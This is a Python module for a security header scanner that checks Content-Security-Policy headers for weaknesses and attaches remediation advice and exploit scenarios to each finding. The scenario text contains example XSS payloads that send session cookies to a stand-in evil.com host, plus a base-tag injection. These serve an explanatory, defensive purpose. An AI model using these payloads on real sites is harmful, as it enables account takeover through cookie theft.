"""Content-Security-Policy checker — deep misconfiguration analysis."""

from __future__ import annotations

from ..models import FindingStatus, HeaderFinding, Severity
from .base import BaseHeaderChecker

# Directives whose tokens can be overridden by script-src; if script-src is
# absent the browser falls back to default-src.
_SCRIPT_DIRECTIVES = {"script-src", "script-src-elem", "script-src-attr"}

# Meta-only directives that provide no source restriction
_USELESS_ONLY = {"upgrade-insecure-requests", "block-all-mixed-content"}

_XSS_SCENARIO = (
    "Cross-Site Scripting (XSS) via missing/weak CSP:\n\n"
    "1. Attacker finds a reflected input: example.com/search?q=<INPUT>\n"
    "2. Injects: <script src='https://evil.com/steal.js'></script>\n"
    "   or (if unsafe-inline): <script>fetch('https://evil.com/?c='+document.cookie)</script>\n"
    "3. Without CSP, browser executes the injected script with full page privileges\n"
    "4. Script reads session cookies → sends them to attacker's server\n"
    "5. Attacker replays cookie → full account access, no password needed\n\n"
    "Advanced XSS chains (no CSP to stop them):\n"
    "• DOM clobbering → prototype pollution → RCE in Node.js-rendered apps\n"
    "• BeEF framework hooks the browser: attacker gets live keyboard/mouse control\n"
    "• Formjacking: keylogger on checkout pages (Magecart attacks, $X million stolen)"
)

_XSS_REFS = [
    "https://portswigger.net/web-security/cross-site-scripting",
    "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
    "https://portswigger.net/web-security/cross-site-scripting/exploiting",
    "https://csp-evaluator.withgoogle.com/",
    "https://beefproject.com/",
    "https://owasp.org/www-community/attacks/xss/",
    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection",
]


class CSPChecker(BaseHeaderChecker):
    """
    Deep Content-Security-Policy analyser.

    Checks for the full spectrum of real-world misconfigurations:
    • Completely missing
    • Effectively empty (only meta-directives)
    • unsafe-inline / unsafe-eval / unsafe-hashes in script-src
    • Wildcard (*) in script-src or default-src
    • https: / http: scheme wildcards (allows any host on that scheme)
    • data: URI in script-src (data-URI XSS payload vector)
    • Missing object-src (Flash/plugin XSS pivot)
    • Missing base-uri (base-tag injection → XSS in SPAs)
    • Missing form-action (form POST hijacking)
    """

    header_name = "content-security-policy"
    max_penalty = 30
    bonus = 0

    def check(self, headers: dict[str, str]) -> HeaderFinding:
        # Check for report-only (not enforcing)
        report_only = self._get(headers, "content-security-policy-report-only")

        value = self._get(headers)

        if value is None:
            if report_only:
                return HeaderFinding(
                    header="Content-Security-Policy",
                    status=FindingStatus.WARNING,
                    severity=Severity.HIGH,
                    score_impact=-20,
                    title="CSP is in report-only mode — not enforced",
                    description=(
                        "Content-Security-Policy-Report-Only is set but there is no enforcing "
                        "Content-Security-Policy header. Report-only mode collects violation "
                        "reports but does NOT block any malicious scripts or resources. "
                        "An attacker's XSS payload runs unhindered."
                    ),
                    recommendation=(
                        "Once you have validated the report-only policy is not causing "
                        "false positives, promote it to enforcement:\n\n"
                        "  Content-Security-Policy: <your-policy-here>"
                    ),
                    references=["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"],
                    exploit_scenario=_XSS_SCENARIO,
                    exploit_references=_XSS_REFS,
                )

            return HeaderFinding(
                header="Content-Security-Policy",
                status=FindingStatus.MISSING,
                severity=Severity.CRITICAL,
                score_impact=-self.max_penalty,
                title="Content-Security-Policy is missing",
                description=(
                    "CSP is your primary defence against Cross-Site Scripting (XSS). "
                    "Without it, any injected script runs with full page privileges — "
                    "reading cookies, sending credentials elsewhere, and hijacking the UI. "
                    "CSP lets you declare exactly which sources may load scripts, styles, "
                    "images, and fonts; the browser blocks everything else."
                ),
                recommendation=(
                    "Start in report-only mode, then promote to enforcement:\n\n"
                    "  Content-Security-Policy-Report-Only: default-src 'self'; "
                    "script-src 'self' 'nonce-RANDOM'; object-src 'none'; "
                    "base-uri 'self'; form-action 'self';\n\n"
                    "Use per-request nonces rather than 'unsafe-inline'. "
                    "Google's strict CSP guide: https://csp.withgoogle.com/docs/strict-csp.html"
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
                    "https://csp.withgoogle.com/docs/strict-csp.html",
                    "https://content-security-policy.com/",
                ],
                exploit_scenario=_XSS_SCENARIO,
                exploit_references=_XSS_REFS,
            )

        directives = _parse_directives(value)

        # ── Effectively empty policy ──────────────────────────────────────────
        if _is_only_useless(directives):
            return HeaderFinding(
                header="Content-Security-Policy",
                status=FindingStatus.WARNING,
                severity=Severity.HIGH,
                score_impact=-20,
                title="CSP is present but provides no XSS protection (only meta-directives)",
                description=(
                    "The CSP header only contains 'upgrade-insecure-requests' or "
                    "'block-all-mixed-content'. These control protocol upgrades, not "
                    "content loading. No source restrictions are in place — an XSS "
                    "payload can load scripts from anywhere."
                ),
                current_value=value,
                recommendation=(
                    "Add resource-loading directives:\n\n"
                    "  default-src 'self'; script-src 'self' 'nonce-RANDOM'; "
                    "object-src 'none'; base-uri 'self';"
                ),
                references=["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"],
                exploit_scenario=_XSS_SCENARIO,
                exploit_references=_XSS_REFS,
            )

        # ── Accumulate all issues ─────────────────────────────────────────────
        issues: list[tuple[str, int]] = []  # (description, penalty)

        default_src = directives.get("default-src", [])
        # Effective script policy: script-src takes priority over default-src
        effective_script = _effective_src(directives, "script-src")
        # Effective object policy
        effective_object = _effective_src(directives, "object-src")
        # Effective style
        effective_style = _effective_src(directives, "style-src")
        # Effective frame-ancestors
        effective_frame = directives.get("frame-ancestors")

        # ── Script-src checks ─────────────────────────────────────────────────

        # 1. Wildcard * (effectively disables CSP for scripts)
        if _has_token(effective_script, "*"):
            issues.append((
                "'*' wildcard in script-src — allows loading scripts from ANY origin, "
                "completely defeating XSS protection", 25
            ))

        # 2. https: scheme wildcard (allows any HTTPS host)
        elif _has_token(effective_script, "https:"):
            issues.append((
                "'https:' scheme in script-src — allows scripts from every HTTPS host "
                "on the internet (attacker just needs any HTTPS site)", 18
            ))

        # 3. http: scheme (worse than https:)
        if _has_token(effective_script, "http:"):
            issues.append((
                "'http:' scheme in script-src — allows scripts from any HTTP host, "
                "including attacker-controlled ones and man-in-the-middle injections", 22
            ))

        # 4. unsafe-inline (only a bypass if no nonce/hash present)
        if _has_token(effective_script, "'unsafe-inline'"):
            has_nonce = any(t.startswith("'nonce-") for t in effective_script)
            has_hash = any(
                t.startswith("'sha256-") or t.startswith("'sha384-") or t.startswith("'sha512-")
                for t in effective_script
            )
            if not has_nonce and not has_hash:
                issues.append((
                    "'unsafe-inline' in script-src without a nonce or hash — inline <script> "
                    "blocks are allowed, which is the primary XSS attack vector CSP is meant "
                    "to block", 18
                ))
            # If nonce/hash present, 'unsafe-inline' is ignored by CSP3-capable browsers — OK

        # 5. unsafe-eval
        if _has_token(effective_script, "'unsafe-eval'"):
            issues.append((
                "'unsafe-eval' in script-src — eval(), new Function(), setTimeout(string), "
                "and setInterval(string) are permitted; attackers can abuse eval() to "
                "execute injected code", 12
            ))

        # 6. unsafe-hashes
        if _has_token(effective_script, "'unsafe-hashes'"):
            issues.append((
                "'unsafe-hashes' in script-src — allows executing scripts matched by hash "
                "in inline event handlers; reduces CSP effectiveness", 8
            ))

        # 7. data: URI in script-src
        if _has_token(effective_script, "data:"):
            issues.append((
                "'data:' in script-src — data: URIs can carry executable JavaScript payloads "
                "(<script src='data:text/javascript,...'>), bypassing source allow-lists", 12
            ))

        # 8. blob: URI in script-src (less severe but worth noting)
        if _has_token(effective_script, "blob:"):
            issues.append((
                "'blob:' in script-src — blob: URLs can wrap arbitrary scripts; "
                "attackers with XSS can create blob: URLs to bypass restrictions", 6
            ))

        # ── object-src check ─────────────────────────────────────────────────
        # If default-src is 'none' or 'self', object-src is implicitly restricted.
        # The real risk is: no object-src AND no default-src, OR default-src allows *
        if "object-src" not in directives:
            if not default_src:
                issues.append((
                    "Missing 'object-src' with no default-src — plugins (Flash, Java "
                    "applets) can be loaded from any source, enabling old-school XSS pivots", 5
                ))
            elif not _has_token(default_src, "'none'") and (
                _has_token(default_src, "*") or _has_token(default_src, "https:")
            ):
                issues.append((
                    "No 'object-src' directive — inherits permissive default-src; "
                    "add 'object-src 'none'' explicitly", 4
                ))
        elif _has_token(effective_object, "*") or _has_token(effective_object, "https:"):
            issues.append((
                "Permissive 'object-src' — plugins can load from external sources; "
                "set to 'none' unless Flash/Silverlight is required (it shouldn't be)", 4
            ))

        # ── base-uri check ───────────────────────────────────────────────────
        # base-uri is NOT covered by default-src, must be explicitly set
        if "base-uri" not in directives:
            issues.append((
                "Missing 'base-uri' — a <base> tag injected via XSS can redirect all "
                "relative URLs (scripts, links, forms) to an attacker's domain; "
                "set to 'self' or 'none'", 5
            ))

        # ── form-action check ────────────────────────────────────────────────
        # form-action is NOT covered by default-src either
        if "form-action" not in directives:
            issues.append((
                "Missing 'form-action' — XSS or CSRF can submit forms to arbitrary URLs; "
                "restrict to 'self' unless you POST to third-party endpoints", 3
            ))

        # ── Style checks ─────────────────────────────────────────────────────
        if _has_token(effective_style, "'unsafe-inline'") and not _has_token(effective_style, "'nonce-"):
            issues.append((
                "'unsafe-inline' in style-src — attackers can inject CSS to perform "
                "UI redressing (fake login forms, hidden content, clickjacking variants)", 5
            ))

        # ── No issues found ───────────────────────────────────────────────────
        if not issues:
            extra = []
            if not effective_frame:
                extra.append(
                    "Consider adding 'frame-ancestors 'none'' or ''self'' to block clickjacking "
                    "(replaces X-Frame-Options in modern browsers)."
                )
            if "'strict-dynamic'" not in str(effective_script):
                extra.append(
                    "For even stronger protection consider 'strict-dynamic' with nonces — "
                    "it allows dynamically-created scripts without whitelisting full domains."
                )
            # ── Trusted Types advisory (2024-2025 research) ───────────────────
            # "Empirical Analysis of Trusted Types Adoption in the Wild" (NDSS 2025)
            # found that even sites with strong CSPs rarely enable Trusted Types,
            # leaving DOM-based XSS sinks (innerHTML, document.write, eval-like APIs)
            # unprotected by enforcement.
            has_trusted_types = "require-trusted-types-for" in directives
            if not has_trusted_types:
                extra.append(
                    "2025 advisory — Trusted Types for DOM XSS prevention:\n"
                    "  Add to CSP: require-trusted-types-for 'script'\n"
                    "  This forces all DOM XSS sinks (innerHTML, document.write, el.src, etc.)\n"
                    "  through Typed objects — preventing DOM-based XSS even if attacker-controlled\n"
                    "  strings reach the DOM. Requires a polyfill for Firefox/Safari.\n"
                    "  Research: NDSS 2025 'Empirical Analysis of Trusted Types Adoption in the Wild'\n"
                    "  Docs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for"
                )
            return HeaderFinding(
                header="Content-Security-Policy",
                status=FindingStatus.PRESENT,
                severity=Severity.CRITICAL,
                score_impact=0,
                title="Content-Security-Policy is well-configured",
                description=(
                    "No common misconfigurations detected in the CSP policy."
                ),
                current_value=value,
                recommendation="\n\n".join(extra) if extra else None,
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
                    "https://csp.withgoogle.com/docs/strict-csp.html",
                    "https://web.dev/trusted-types/",
                ],
            )

        # ── Build consolidated finding ────────────────────────────────────────
        total_penalty = min(sum(p for _, p in issues), self.max_penalty)
        description = (
            "The CSP policy is present but has the following misconfigurations "
            f"({len(issues)} issue(s) found):\n\n"
            + "\n".join(f"• {desc}" for desc, _ in issues)
        )

        severity = Severity.CRITICAL if total_penalty >= 20 else Severity.HIGH

        # Build targeted exploit scenario based on which issues are present
        scenario_parts: list[str] = []
        issue_descs = [desc.lower() for desc, _ in issues]

        if any("https:" in d or "wildcard" in d or "*" in d for d in issue_descs):
            scenario_parts.append(
                "Script-src bypass via allowed CDN host:\n"
                "  1. CSP allows 'https:' or a CDN like cdn.jquery.com\n"
                "  2. Attacker finds an Angular template injection on cdn.xyz.com\n"
                "     OR uploads a .js file to a whitelisted storage bucket\n"
                "  3. Injects: <script src='https://cdn.xyz.com/user-upload/evil.js'></script>\n"
                "  4. CSP allows it — XSS executes despite the policy\n"
                "  Reference: https://csp-evaluator.withgoogle.com/"
            )

        if any("unsafe-inline" in d for d in issue_descs):
            scenario_parts.append(
                "Direct inline XSS (no bypass needed):\n"
                "  1. Attacker injects: <script>document.location='https://evil.com/?c='+document.cookie</script>\n"
                "  2. 'unsafe-inline' means CSP doesn't block this — it executes immediately\n"
                "  3. Session cookies, localStorage tokens, and page content are exfiltrated"
            )

        if any("base-uri" in d for d in issue_descs):
            scenario_parts.append(
                "Base-tag injection (SPA redirect attack):\n"
                "  1. Attacker injects: <base href='https://evil.com/'>\n"
                "  2. All relative paths (../static/app.js) now resolve to evil.com\n"
                "  3. App loads attacker's JS instead of legitimate scripts\n"
                "  4. Without base-uri in CSP, this bypass works even on strict policies"
            )

        exploit_scenario = "\n\n".join(scenario_parts) if scenario_parts else _XSS_SCENARIO

        # Trusted Types advisory in warning case too
        has_trusted_types = "require-trusted-types-for" in directives

        return HeaderFinding(
            header="Content-Security-Policy",
            status=FindingStatus.WARNING,
            severity=severity,
            score_impact=-total_penalty,
            title=f"CSP has {len(issues)} misconfiguration(s) — partial XSS protection only",
            description=description,
            current_value=value,
            recommendation=(
                "Harden your policy step by step:\n\n"
                "1. Replace 'unsafe-inline' with per-request nonces:\n"
                "     script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic'\n\n"
                "2. Remove scheme wildcards (https:, http:) — list explicit trusted hosts\n\n"
                "3. Add: object-src 'none'; base-uri 'self'; form-action 'self';\n\n"
                "4. Remove 'unsafe-eval' — refactor code using eval() / new Function()\n\n"
                "5. Test interactively: https://csp-evaluator.withgoogle.com/\n\n"
                + (
                    "6. [2025] Add Trusted Types for DOM XSS prevention (NDSS 2025 research):\n"
                    "     require-trusted-types-for 'script'\n"
                    "   This closes the DOM-based XSS gap that remains even with a strong CSP.\n"
                    "   Docs: https://web.dev/trusted-types/"
                    if not has_trusted_types else ""
                )
            ),
            references=[
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src",
                "https://csp.withgoogle.com/docs/strict-csp.html",
                "https://csp-evaluator.withgoogle.com/",
                "https://content-security-policy.com/",
            ],
            exploit_scenario=exploit_scenario,
            exploit_references=_XSS_REFS,
        )


# ── Helpers ───────────────────────────────────────────────────────────────────

def _parse_directives(value: str) -> dict[str, list[str]]:
    """Return {directive_name: [token, ...]} from a CSP string."""
    result: dict[str, list[str]] = {}
    for directive in value.split(";"):
        parts = directive.strip().split()
        if parts:
            result[parts[0].lower()] = [p.lower() for p in parts[1:]]
    return result


def _effective_src(directives: dict[str, list[str]], name: str) -> list[str]:
    """Return the effective source list for a directive, falling back to default-src."""
    if name in directives:
        return directives[name]
    return directives.get("default-src", [])


def _has_token(tokens: list[str], token: str) -> bool:
    return token in tokens


def _is_only_useless(directives: dict[str, list[str]]) -> bool:
    real = {k for k in directives if k not in _USELESS_ONLY}
    return len(real) == 0
